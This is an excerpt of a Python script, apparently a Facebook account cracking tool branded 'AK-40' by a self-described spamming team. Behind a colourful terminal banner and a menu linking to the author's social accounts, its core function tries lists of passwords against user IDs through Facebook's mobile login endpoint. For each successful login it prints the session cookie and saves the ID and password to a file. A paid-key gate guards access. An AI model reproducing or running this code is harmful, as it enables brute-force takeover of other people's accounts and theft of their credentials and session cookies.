#WRITTEN BY AJMIR HOSSAIN 
# তর আব্বু রে মনে রাখিছ বাজান S.D.S তর আব্বু লাগে বুঝছো পুত। #####
#14/Nov/2023 07:16:59 GMT+06:00##
...
\033[1;97m██║░░██║██║░╚██╗░░░░░░╚════██║╚█████╔╝
\033[1;97m╚═╝░░╚═╝╚═╝░░╚═╝░░░░░░░░░░░╚═╝░╚════╝░                           
           👿 S.D.S Spmming Team . tor next abbu 😈      
\033[38;5;46m┌━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┐\033[33;1m ┫│\033[38;5;46m𝑬\033[33;1m│┣
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘈𝘜𝘛𝘏𝘖𝘙      \033[1;97m  :  \033[34;1mAjmir Hossain  \033[38;5;46m│ \033[33;1m┫│\033[38;5;46m𝑹\033[33;1m│┣
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;97m:  \033[34;1m AK-40      \033[38;5;46m   │  \033[33;1m┗━┛
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗   \033[1;97m   :  \033[34;1m01813225678      \033[38;5;46m│
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘗𝘖𝘞𝘌𝘙       \033[1;97m  :  \033[34;1mAjmir Hossain        \033[38;5;46m│
...
def Main():
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/Ajmir.Hossain.008');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://wa.me/+8801813225678');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def admin():
	...
	if bal =='2':
		...
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/AK-40');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mAK-40-👿\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            'user-agent': 'pro',
            'viewport-width': '980',}
            lo = session.post('https://p.facebook.com/?rtime=1699866981&subno_key=AaFhxPcfovdVAWfJvWN8xU3E6-OQ_im0MxiCSM8QYGVgF6vdrVGaWyfEMLFSiVg_h0SvopDmibohSoicBoqSt2LpnKmKDiFQour0nP3rq6nJbwL-RgrxGnrLrJ0ZW4_i7qFum2E-nI_z6XpYzc_gtGtxw2U4J4uG128jYp6de09f5tNcT7ac6MUINw7nuKsKbW_agXGrR107lG2vo70dHkThK2IgxUfEDso25J8w0G0AL_hGkgiHzbNUNWau8h8azdKZWOVd1Q5whD2Dru6PM8jX4yfYCkg9fJqYEBEhj5WkVzjLdGqs2iMWTgcrHow7_ak&hrc=1&wtsid=rdr_079hDGkIA3Ktjh27F&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [AK-40-OK💥] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💉]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/AK-40-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    if id in DARK:
        ...
        print ("\n")
        os.system("espeak \"Assalamualaikum. Iam AK-40 and my tools Owner Ajmir Hossain. sir this tools id paid because 100% ok id just now log in \"")
        name = input(" Your Name : ")
        os.system(f"espeak \"{name} ,prass Enter to send your key\"")
        print ("")
        input(" Press Enter To Send Key")
        os.system("xdg-open https://wa.me/+8801813225678")
        superuser()        
superuser()
